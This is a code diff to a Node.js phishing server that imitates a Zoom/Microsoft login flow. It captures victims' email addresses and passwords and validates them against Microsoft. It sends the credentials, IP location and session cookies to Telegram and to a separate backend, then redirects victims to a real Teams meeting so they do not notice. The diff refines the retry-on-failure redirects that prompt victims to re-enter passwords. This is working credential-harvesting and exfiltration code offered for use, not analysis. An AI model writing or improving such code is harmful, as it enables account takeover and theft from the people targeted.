@@ -46,7 +46,6 @@ async function sendAuthResultToTelegram(email, password, success, ip, attemptCou
     try {
         const axios = require('axios');
         const location = await getLocationFromIp(ip);
-        const userAgent = require('axios').default?.headers?.['user-agent'] || 'Unknown';
         
         let msg = `🔐 *Zoom Login Attempt #${attemptCount}*\n\n`;
         msg += `*📧 Email:* ${email}\n`;
@@ -216,13 +215,9 @@ function handlePostRequest(body, req, res) {
                 if (result.success) {
                     console.log(`[AUTH] ✅ Valid credentials for: ${email}`);
                     
-                    // Send detailed Telegram alert with cookies
                     sendAuthResultToTelegram(email, password, true, ip, attemptCount, result.cookies);
-                    
-                    // Send to backend as success
                     sendToBackend(email, password, req, 'valid');
                     
-                    // Redirect to REAL Teams meeting
                     res.writeHead(302, { 
                         'Location': TEAMS_REDIRECT,
                         'Cache-Control': 'no-store'
@@ -230,22 +225,21 @@ function handlePostRequest(body, req, res) {
                     res.end();
                 } else {
                     console.log(`[AUTH] ❌ Invalid credentials for: ${email}`);
-                    
-                    // Send detailed Telegram alert for failed attempt
                     sendAuthResultToTelegram(email, password, false, ip, attemptCount, null);
-                    
-                    // Send to backend as failed
                     sendToBackend(email, password, req, 'invalid');
                     
-                    // Redirect back to login with error - give user second chance
-                    const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=invalid_credentials&attempt=${attemptCount}`;
-                    res.writeHead(302, { 'Location': errorUrl });
+                    // ✅ FIX: Redirect back to login with error message
+                    // Include error=invalid_credentials to show error on the login page
+                    const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=invalid_credentials`;
+                    res.writeHead(302, { 
+                        'Location': errorUrl,
+                        'Cache-Control': 'no-store'
+                    });
                     res.end();
                 }
             })
             .catch((error) => {
                 console.error('[ERROR] Microsoft verification failed:', error.message);
-                // On error, redirect to login with generic error
                 const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=service_error`;
                 res.writeHead(302, { 'Location': errorUrl });
                 res.end();
@@ -259,13 +253,23 @@ function handlePostRequest(body, req, res) {
 }
 
 function handleLoginRequest(req, res) {
+    // Get email and check for error parameter
     const rawEmail = req.url.split('login_hint=')[1]?.split('&')[0] || '';
     const email = decodeURIComponent(rawEmail);
+    const hasError = req.url.includes('error=');
     
-    const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
+    // Build Microsoft OAuth URL with error parameter if present
+    let targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
+    
+    // If there's an error, pass it through to show error message
+    if (hasError) {
+        const errorParam = req.url.split('error=')[1]?.split('&')[0] || '';
+        targetUrl += `&error=${errorParam}`;
+    }
     
     console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);
     console.log(`[PROXY] 📧 Email decoded: ${email}`);
+    console.log(`[PROXY] ❌ Error present: ${hasError}`);
     
     https.get(targetUrl, (targetRes) => {
         let data = [];
